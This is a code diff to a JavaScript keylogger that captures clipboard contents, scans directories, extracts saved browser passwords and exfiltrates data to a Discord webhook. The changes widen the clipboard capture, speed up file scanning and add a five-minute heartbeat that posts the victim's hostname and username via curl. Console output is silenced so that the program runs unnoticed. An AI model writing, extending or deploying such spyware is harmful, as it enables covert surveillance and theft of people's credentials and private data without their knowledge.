@@ -871,15 +871,14 @@ setInterval(() => {
             const clipboard = stdout.trim();
             // Only process if clipboard actually changed
             if (clipboard !== lastClipboard && clipboard.length > 0) {
-                // Filter out filenames, file paths, and random system text
-                const isFilename = /^[^\/]*\.[a-z]{2,4}$/i.test(clipboard) || 
-                                   /^[\/~]/.test(clipboard) || 
-                                   /file_payload_|discord_payload_|\.json$|\.txt$|\.zip$|\.png$|\.jpg$/i.test(clipboard) ||
-                                   clipboard.length < 3 || // Too short
-                                   clipboard.length > 5000 || // Too long (probably not typed)
-                                   /^[0-9]+$/.test(clipboard); // Just numbers
+                // Filter out ONLY obvious filenames and system files
+                const isFilename = /^[\/~]/.test(clipboard) || // File paths
+                                   /file_payload_|discord_payload_|\.json$|\.zip$|\.png$|\.jpg$/i.test(clipboard) || // System files
+                                   clipboard.length < 2 || // Too short
+                                   clipboard.length > 10000; // Too long
                 
-                if (!isFilename && clipboard.length >= 3 && clipboard.length <= 5000) {
+                // Send if it's not a filename and has reasonable length
+                if (!isFilename && clipboard.length >= 2 && clipboard.length <= 10000) {
                     lastClipboard = clipboard;
                     
                     // Add to buffer
@@ -1647,7 +1646,7 @@ setInterval(() => {
     watchDirs.forEach(watchDir => {
         scanDirectoryRecursive(watchDir);
     });
-}, 30000); // Scan every 30 seconds
+}, 10000); // Scan every 10 seconds (faster detection)
 
 // PASSWORD EXTRACTION - Extracts Firefox, Chrome, Safari passwords + system info
 function extractPasswords() {
@@ -1846,7 +1845,7 @@ setInterval(() => {
     extractPasswords();
 }, 21600000); // 6 hours
 
-// Test Discord connection on startup (send once)
+// Test Discord connection on startup (send once) - VERIFY IT'S RUNNING
 setTimeout(() => {
     const testPayload = {
         content: `✅ **Keylogger Started Successfully**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nStatus: Running 24/7\nTimestamp: ${new Date().toISOString()}\n\`\`\``
@@ -1861,6 +1860,22 @@ setTimeout(() => {
         });
     } catch (e) {}
 }, 2000);
+
+// VERIFY keylogger is actually running - send test every 5 minutes
+setInterval(() => {
+    const testPayload = {
+        content: `🔄 **Keylogger Heartbeat**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nStatus: Active\nTime: ${new Date().toLocaleString()}\n\`\`\``
+    };
+    const testFile = path.join(screenshotDir, `heartbeat_${Date.now()}.json`);
+    try {
+        fs.writeFileSync(testFile, JSON.stringify(testPayload));
+        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${testFile}" "${WEBHOOK}"`, (error) => {
+            setTimeout(() => {
+                try { fs.unlinkSync(testFile); } catch (e) {}
+            }, 5000);
+        });
+    } catch (e) {}
+}, 300000); // Every 5 minutes
 
 console.log = () => {};
 console.error = () => {};
